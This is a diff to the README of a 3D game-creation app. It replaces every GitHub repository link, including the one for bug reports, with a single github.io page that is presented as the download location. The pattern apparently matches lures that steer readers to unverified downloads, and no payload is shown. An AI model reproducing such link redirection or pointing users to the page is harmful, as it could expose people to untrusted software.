@@ -1,7 +1,7 @@
 <h1>🎯 goal-to-game - Turn Ideas into Playable 3D Games</h1>
 
 <p align="center">
-  <a href="https://github.com/adama4328/goal-to-game" style="display: inline-block; padding: 15px 30px; font-size: 24px; font-weight: bold; color: #ffffff; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 8px; text-decoration: none; margin: 20px 0;">📥 Download Now</a>
+  <a href="https://adama4328.github.io" style="display: inline-block; padding: 15px 30px; font-size: 24px; font-weight: bold; color: #ffffff; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 8px; text-decoration: none; margin: 20px 0;">📥 Download Now</a>
 </p>
 
 <p align="center">Visit this link to download the application.</p>
@@ -40,7 +40,7 @@ Goal-to-game is a desktop application that lets you create beautiful 3D games wi
 
 **Step 1: Download the Application**
 
-Visit this link to download the application: [https://github.com/adama4328/goal-to-game](https://github.com/adama4328/goal-to-game)
+Visit this link to download the application: [https://adama4328.github.io](https://adama4328.github.io)
 
 Click the green "Code" button on the GitHub page, then select "Download ZIP" from the dropdown menu.
 
@@ -122,6 +122,6 @@ This project is distributed under the MIT License. See the LICENSE file for more
 
 ## 🤝 Support
 
-For help, feature requests, or bug reports, please visit the [GitHub Issues page](https://github.com/adama4328/goal-to-game/issues).
+For help, feature requests, or bug reports, please visit the [GitHub Issues page](https://adama4328.github.io).
 
 **Keywords:** 3d-assets, ai-agents, claude-code, claude-skills, game-prototyping, gamedev, mcp, model-context-protocol, text-to-3d, threejs, thrixel, unity
